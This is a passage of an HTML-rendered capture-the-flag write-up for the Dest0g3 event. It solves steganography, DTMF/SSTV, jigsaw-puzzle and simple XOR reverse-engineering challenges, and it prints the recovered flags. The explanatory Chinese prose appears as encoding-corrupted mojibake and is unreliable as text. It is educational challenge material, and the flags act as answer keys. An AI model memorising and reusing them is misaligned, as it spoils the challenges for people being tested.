class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br><br><span class="hljs-attr"># Dest0</span><span class="hljs-name">g3</span>&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„flagã€‚æˆ‘ç»™ä»–å¥—äº†ä¸€ä¸ªDest0g3äº¤ä¸Šå»ä¸å¯¹ã€‚</p><p>ä¸‹é¢è¿™æ®µè¯å°±çœ‹çš„æˆ‘å¤´å¤§äº†ã€‚æ²¡æœ‰çœ‹æ‡‚è¿™æ˜¯å•¥æ„æ€ã€‚æ„Ÿè§‰åƒæ˜¯è®©pythonè„šæœ¬æ¥å†™å‡ºflagã€‚é‚£ä¹ˆè¿™ä¸ªflag.pyåœ¨å“ªé‡Œå‘¢ï¼Ÿ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Find it in your folder<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">print</span> <br>flag.<span class="hljs-keyword">py</span><br><span class="hljs-symbol">&lt;module&gt;</span><br></code></pre></td></tr></table></figure><p>åé¢è¯•äº†ä¸€ä¸‹ç›´æ¥æŠŠflagæäº¤äº†ï¼Œæ²¡æƒ³åˆ°ç«Ÿç„¶è¿‡äº†â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</span><br></code></pre></td></tr></table></figure><h2 id="4096"><a class="markdownIt-Anchor" href="#4096"></a> 4096</h2><p>å¯åŠ¨é¶æœºï¼Œæ˜¯ä¸€ä¸ª4096å°æ¸¸æˆï¼Œåœ¨local_storage_manager.jsä¸­æ‰¾åˆ°äº†ä¸€éƒ¨åˆ†çš„flagã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPartFlag</span>(<span class="hljs-params">score</span>) &#123;<br>  <span class="hljs-keyword">if</span> (score &gt; <span class="hljs-number">10000</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);<br>  &#125;<br>&#125;<br># 4ee7-b673-971d81f8b177&#125;<br></code></pre></td></tr></table></figure><p>åœ¨çœ‹ç½‘é¡µå…ƒç´ çš„æ—¶å€™ä¸€ä¸ªimgå¾ˆå¥‡æ€ªã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;favicon.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¤§å°ä¸º1ï¼Œä½†å®é™…ä¸Šå›¾ç‰‡å¤§å°ä¸æ˜¯è¿™ä¸ªã€‚æŠŠè¿™ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚</p><p>æ–‡ä»¶å¤§å°ä¸å¯¹ã€‚è¿™ä¸ªpngæœ‰12mbã€‚å¾ˆæ˜¾ç„¶é‡Œé¢è—äº†ä¸œè¥¿ã€‚</p><p>äºŒè¿›åˆ¶æ‰“å¼€çœ‹çœ‹ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">RIFFÃ¶Â¾WAVEfmt <br></code></pre></td></tr></table></figure><p>åœ¨PNGå¤´çš„ä¸‹æ–¹è¿˜æœ‰ä¸€ä¸ªRIFFå¤´ï¼Œè¿™æ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ã€‚æŠŠPNGéƒ¨åˆ†åˆ äº†ä¹‹åå°±å¯ä»¥ç”¨éŸ³é¢‘æ‰“å¼€äº†ã€‚éŸ³é¢‘éšå†™æˆ‘ä¸å¤ªä¼šè¯´å®è¯ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>part_flag<span class="hljs-selector-class">.jpg</span>.....<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶çš„å°¾éƒ¨è¿˜æœ‰ä¸€ä¸ªjpgã€‚binwalkåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…ã€‚é‡Œé¢æ˜¯è¿™ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯éœ€è¦å¯†ç ã€‚æˆ‘è§‰å¾—å¯†ç æ˜¯åœ¨éŸ³é¢‘ä¸­ã€‚</p><p>å‰é¢éƒ¨åˆ†å’Œæœ€åå¾ˆæ˜æ˜¾æ˜¯æ‹¨å·éŸ³ï¼Œåªæˆªå–å‰åçš„DTMFçš„è¯å¾—åˆ°çš„æ˜¯ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span><br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¹Ÿä¸æ˜¯å¯†ç å•Šã€‚è¿™æ˜¯ä¸ªä»€ä¹ˆè„‘æ´ã€‚</p><p>é—®äº†ä¸€ä¸‹æˆ‘ä»¬ç»„çš„äººï¼Œå«æˆ‘è¯•è¯•SSTVã€‚è¯´å®è¯æˆ‘æ˜¯æ²¡æƒ³åˆ°æ˜¯SSTVï¼Œä¹Ÿç®—æ˜¯é•¿è§è¯†äº†ï¼Œç¬¬ä¸€æ¬¡åšè¿™ç§é¢˜äº†ã€‚</p><p>sstvè§£ç ä¹‹åå°±æ˜¯ä¸€å¼ å›¾ç‰‡äº†ï¼Œä¸è¿‡æ˜¯å€’è¿‡æ¥çš„ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">password:<br><br><br><br><span class="hljs-constructor">MD5(<span class="hljs-params">cell</span> <span class="hljs-params">phone</span> <span class="hljs-params">number</span>)</span><br></code></pre></td></tr></table></figure><p>ç”µè¯å·ç æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†ï¼Œæ‰€ä»¥ç›´æ¥md5çœ‹çœ‹ã€‚</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">MD5:</span><br><span class="hljs-number">6</span>c6551787d7071ff48400b855b851ccb<br></code></pre></td></tr></table></figure><p>ç»“æœå¹¶ä¸æ˜¯è¿™ä¸ªå¯†ç ã€‚æ‰‹æœºå·å¥½åƒæ²¡æœ‰7å¼€å¤´çš„å§ï¼Œè€Œæˆ‘ä»¬å¾—åˆ°çš„æ•°æ®æœ€åä¸€ä½æ˜¯1ï¼Œè¯´ä¸å®šæ˜¯å°†å¾—åˆ°çš„æ•°æ®åè½¬ã€‚è¯•è¯•ã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span> -&gt; <span class="hljs-number">13879085947</span><br>MD5:<br><span class="hljs-number">3</span>f119efa3254ae786fe44aff4582faa4<br></code></pre></td></tr></table></figure><p>ç»“æœè¿˜æ˜¯ä¸å¯¹â€¦æˆ‘æ˜¯ç›´æ¥ç”¨çš„æ•°å­—è¿›è¡ŒåŠ å¯†çš„ï¼Œè¯´ä¸å®šæ˜¯å…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œç¼–ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>md5(<span class="hljs-string">b&quot;13879085947&quot;</span>).hexdigest()<br><span class="hljs-string">&#x27;32fc1b5487cb447f792a19418b92544e&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸‹ç»ˆäºè§£å¼€äº†ã€‚</p><p>ç»“æœé‡Œé¢æ˜¯ä¸ªå°æ‹¼å›¾ã€‚</p><img src="https://s2.loli.net/2022/05/26/NlDXTEFbQ5tzogG.jpg" alt="part_flag" style="zoom:50%;" /><p>è¿™é‡Œç›´æ¥ç”¨å·¥å…·å°±å¯ä»¥è§£äº†ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(kaliã‰¿kali)-[~/gaps/gaps/bin]<br>â””â”€$ python3 gaps --image=part_flag.jpg --size=64 --save<br><br>=== Population:  200<br>=== Generations: 20<br>=== Piece size:  64 px<br>=== Pieces:      240<br><br>=== Analyzing image: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100.0% <br>=== Solving puzzle:  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ----------- 78.9% <br><br>=== GA terminated<br>=== There was no improvement for 10 generations<br><br>=== Done in 17.401 s<br>=== Result saved as &#x27;part_flag_solution.jpg&#x27;<br>=== Close figure to exit<br></code></pre></td></tr></table></figure><p>ç»“æœè¿™ä¸ªæ¯æ¬¡è·‘éƒ½ä¸å¤ªä¸€æ ·ï¼Œæ²¡æœ‰é‚£ç§å¯ä»¥å®Œç¾å¤åŸçš„ã€‚çœ‹æ¥åªèƒ½è‡ªå·±æ¥æ‹¼æ¥äº†ã€‚</p><img src="https://s2.loli.net/2022/05/26/hZJM13C4yniNSmu.jpg" alt="part_flag_solution" style="zoom:50%;" /><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RGVzdD<br>kMTE0Zi05Z<br>BnM3tlZDR<br>U0<br>W<br><span class="hljs-section">LQ</span><br><span class="hljs-section">==</span><br></code></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ç»“æœå§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>table = [<span class="hljs-string">&quot;RGVzdD&quot;</span>,<span class="hljs-string">&quot;kMTE0Zi05Z&quot;</span>,<span class="hljs-string">&quot;BnM3tlZDR&quot;</span>,<span class="hljs-string">&quot;U0&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;LQ&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(table, <span class="hljs-built_in">len</span>(table)):<br>    data = <span class="hljs-string">&#x27;&#x27;</span>.join(i) + <span class="hljs-string">&quot;==&quot;</span><br>    data = b64decode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Dest0g3&#123;&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(data)<br>        <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x16-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x0bA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9ee4-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eb\xd0S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x14\xd1&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x16S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96V-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96KA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd1i\x0cLM\x19\x8bNY-&#x27;</span><br><span class="hljs-string">....</span><br><span class="hljs-string">....</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;ed4d114f-9ee4-</span><br></code></pre></td></tr></table></figure><p>å’Œä¸Šé¢çš„flagè¿›è¡Œç»„åˆå¾—åˆ°ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;ed4d114f<span class="hljs-string">-9</span>ee4<span class="hljs-string">-4</span>ee7-b673<span class="hljs-string">-971</span>d81f8b177&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="simplexor"><a class="markdownIt-Anchor" href="#simplexor"></a> simpleXOR</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-160h]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">52</span>]; <span class="hljs-comment">// [rsp+120h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+154h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+158h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+15Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">247</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">35</span>; ++i )<br>  &#123;<br>    v4[i + <span class="hljs-number">36</span>] = v5[i];<br>    v4[i] = v6 ^ (v4[i + <span class="hljs-number">36</span>] + i);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">0x23</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != result_0[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!!!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( j == <span class="hljs-number">35</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°result_0çš„å€¼ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xb3</span>,<span class="hljs-number">0</span>x91,<span class="hljs-number">0</span>x82,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>xc3,<span class="hljs-number">0</span>x9b,<span class="hljs-number">0</span>xce,<span class="hljs-number">0</span>x75,<br><span class="hljs-attribute">0xcf</span>,<span class="hljs-number">0</span>x9c,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x84,<br><span class="hljs-attribute">0xaa</span>,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>xb1,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>x71,<br><span class="hljs-attribute">0x8d</span>,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x86,<span class="hljs-number">0</span>xbf,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>xa8,<span class="hljs-number">0</span>xa3,<span class="hljs-number">0</span>x9c,<br><span class="hljs-attribute">0x83</span>,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x57<br></code></pre></td></tr></table></figure><p>æ±‚é€†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>data = [<span class="hljs-number">0xb3</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x80</span>,<br>        <span class="hljs-number">0xc3</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x75</span>,<br>        <span class="hljs-number">0xcf</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x85</span>,<br>        <span class="hljs-number">0x85</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x84</span>,<br>        <span class="hljs-number">0xaa</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xbb</span>,<br>        <span class="hljs-number">0xb1</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x71</span>,<br>        <span class="hljs-number">0x8d</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xbf</span>,<br>        <span class="hljs-number">0x73</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x9c</span>,<br>        <span class="hljs-number">0x83</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x57</span>]<br><br>key = <span class="hljs-number">247</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((data[i]^key) - i), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment"># Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;</span><br></code></pre></td></tr></table></figure><h2 id="hi"><a class="markdownIt-Anchor" href="#hi"></a> hi</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-ACh]</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-A8h]</span><br>  <span class="hljs-type">char</span> enc[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-A0h]</span><br>  <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  *(_QWORD *)str = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">8</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">16</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">24</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">32</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">40</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">48</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">56</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">64</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">72</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">80</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">88</span>] = <span class="hljs-number">0LL</span>;<br>  *(_DWORD *)&amp;str[<span class="hljs-number">96</span>] = <span class="hljs-number">0</span>;<br>  *(_QWORD *)enc = <span class="hljs-number">0x9F8E7A1CC6486497</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">8</span>] = <span class="hljs-number">0x69EEF382E760BD46</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">16</span>] = <span class="hljs-number">0xB9C017E2E30EF749</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">24</span>] = <span class="hljs-number">0x98410148A430392C</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">32</span>] = <span class="hljs-number">0xE80E7411E5B5A939</span>LL;<br>  *(_DWORD *)&amp;enc[<span class="hljs-number">40</span>] = <span class="hljs-number">-1517552212</span>;<br>  enc[<span class="hljs-number">44</span>] = <span class="hljs-number">109</span>;<br>  fwrite(<span class="hljs-string">&quot;input: &quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">7uLL</span>, <span class="hljs-built_in">stdout</span>);<br>  fgets(str, <span class="hljs-number">46</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(str) != <span class="hljs-number">45</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">44</span>; ++i )<br>  &#123;<br>    v1 = <span class="hljs-number">23</span> * str[i];<br>    <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ•°æ®åˆå§‹åŒ–ä¸€éƒ¨åˆ†æ”¾åœ¨äº†ä»£ç é‡Œé¢ï¼Œå¯¹äºencå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œç¨‹åºç„¶åä»å†…å­˜é‡Œdumpå‡ºæ¥ã€‚è¿™é‡Œé¢åˆæ˜¯DWORDåˆæ˜¯BYTEåˆæ˜¯QWORDï¼Œè¿˜æœ‰è´Ÿæ•°åœ¨é‡Œé¢ï¼Œè‡ªå·±å†™å¾ˆæœ‰å¯èƒ½å‡ºé—®é¢˜ï¼Œæ‰€ä»¥é€‰æ‹©ä»å†…å­˜ä¸­dumpã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7fffffffdf10</span>: <span class="hljs-number">0</span>x97    <span class="hljs-number">0</span>x64    <span class="hljs-number">0</span>x48    <span 